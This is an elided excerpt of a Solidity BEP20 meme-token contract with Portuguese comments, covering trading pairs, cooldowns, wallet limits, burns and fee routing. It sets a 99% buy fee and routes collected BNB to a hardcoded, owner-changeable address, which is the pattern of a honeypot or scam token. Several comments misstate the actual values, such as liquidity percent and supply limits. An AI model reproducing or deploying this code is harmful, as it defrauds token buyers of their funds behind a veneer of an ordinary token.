...
contract XElonHarrySonicObamaMario1996Inu is IBEP20, Ownable {
    /*=== SafeMath ===*/
    using SafeMath for uint256;
    using Address for address;
    /*=== Endereços ===*/
    address private burnAddress = address(0); // Endereço de Queima
    address public internalOperationAddress; // Distribui as Recompensas para os Holders
    IUniswapV2Router02 public uniswapV2Router; // Endereço Router
    address public uniswapV2Pair; // Par TOKEN/BNB
    /*=== Mapeamento ===*/
    ...
    mapping(address => uint256) public cooldownTimerBuy; // Tempo de Compra
    mapping(address => uint256) public cooldownTimerSell; // Tempo de Venda
    /*=== Unitarios ===*/
    ...
    uint256 public buyFee = 99; // Taxa de Compra
    uint256 private previousBuyFee; // Armazena Taxa de Compra
    uint256 public sellFee = 12; // Taxa de Venda
    uint256 private previousSellFee; // Armazena Taxa de Venda
    uint256 private limitBurn = 1000000000 * _decimalFactor;
    uint256 public liquidityPercent = 10; // Taxa de Liquidez 20%
    uint256 public maxWalletBalance = 1000000000000 * _decimalFactor; // 1% do Supply
    uint256 public maxBuyAmount = 1000000000000 * _decimalFactor; // 1% do Supply
    uint256 public maxSellAmount = 1000000000000 * _decimalFactor; // 1% do Supply
    uint256 public numberOfTokensToSwapToLiquidity = 10000000 * _decimalFactor; // 0,05% do Supply
    /*=== Boolean ===*/
    ...
    /*=== Strings ===*/
    string private _name = "XElonHarrySonicObamaMario1996Inu";
    string private _symbol = "XElon1996";
    /*=== Modifiers ===*/
    ...
    constructor() {
        ...
        address pairCreated = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH()); // Gera o Par TOKEN/BNB
        uniswapV2Router = _uniswapV2Router; // Armazena Rota
        uniswapV2Pair = pairCreated; // Armazena Par
        cooldownTimerInterval = 20;
        _balance[owner()] = _tSupply; // Define Owner como Detentor dos _Tokens
        internalOperationAddress = 0x3ea1e55dabbBDBcE80607BeeD9fdc6D176fF170a; // Define Endereço de Operações
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            ...
            "O pair de AutomatedMarketMakerPair ja esta definido para esse valor"
        );
    ...
    function lockToBuyOrSellForTime(uint256 lastBuyOrSellTime, uint256 lockTime)
        private
        lockCoolDown
        returns (bool)
    {
    ...
    function getFromLastPurchaseBuy(address walletBuy)
        private
        view
        returns (uint256)
    {
    ...
    function getFromLastSell(address walletSell)
        private
        view
        returns (uint256)
    {
    ...
    function _transferTokens(
        ...
        if (automatedMarketMakerPairs[from]) {
            ...
            if (
                amount > maxBuyAmount &&
                !_unlimitedAddress(from) &&
                !_unlimitedAddress(to)
            ) {
            ...
            if (buyCooldownEnabled && !isTimelockExempt[to] && !coolDownUser) {
                require(
                    lockToBuyOrSellForTime(
                        getFromLastPurchaseBuy(to),
                        cooldownTimerInterval
                    ),
                    "Por favor, aguarde o cooldown entre as compras"
                );
                buyCoolDown(to);
            }
            ...
            if (
                sellCooldownEnabled && !isTimelockExempt[from] && !coolDownUser
            ) {
                require(
                    lockToBuyOrSellForTime(
                        getFromLastSell(from),
                        cooldownTimerInterval
                    ),
                    "Por favor, aguarde o cooldown entre as vendas"
                );
                sellCoolDown(from);
            }
        }
        ...
        if (
            ...
            require(
                recipientBalance.add(amount) <= maxWalletBalance,
                "Nao pode Ultrapassar o limite por Wallet"
            );
        }
    ...
    function liquify(uint256 contractTokenBalance, address sender) internal {
        if (contractTokenBalance >= numberOfTokensToSwapToLiquidity)
            contractTokenBalance = numberOfTokensToSwapToLiquidity; // Define se a Quantidade de Tokens para
        ...
        if (
            ...
            uint256 tokenLiquidity = contractTokenBalance
                .mul(liquidityPercent)
                .div(100); // Quantidade de Tokens que vai para Liquidez
    ...
    function _sendBNBToContract(uint256 tAmount) private lockTheSwap {
        ...
        if (isSendToken) {
            ...
            if (initialBalance > 0) {
                (bool sent, ) = internalOperationAddress.call{
                    value: address(this).balance
                }("");
                if (sent) {
                    emit SentBNBInternalOperation(
                        internalOperationAddress,
                        initialBalance
                    );
                }
            }
        ...
        returns (bool)
    {
        ...
        require(
            ...
            "reducao do subsidio abaixo de zero"
        );
    ...
    function changeAutomatedMarketMakerPair(address pair, bool value)
        external
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "uniswapV2Pair nao pode ser removido de AutomatedMarketMakerPair"
        );
    ...
    function changeAddress(address _internalOperationAddress)
        external
        onlyOwner
    {
    ...
    function setActiveCoolDown(
        bool _buyCooldownEnabled,
        bool _sellCooldownEnabled,
        uint256 _cooldownTimerInterval
    ) external onlyOwner {
        require(
            _cooldownTimerInterval <= 3600,
            "Limite de Compra e Venda nao pode ser maior do que 1 Hora"
        );
    ...
    function burn(uint256 bAmount) external onlyOwner {
        require(
            bAmount <= limitBurn,
            "Nao pode queimar mais do que o programado"
        );
        _tSupply -= bAmount;
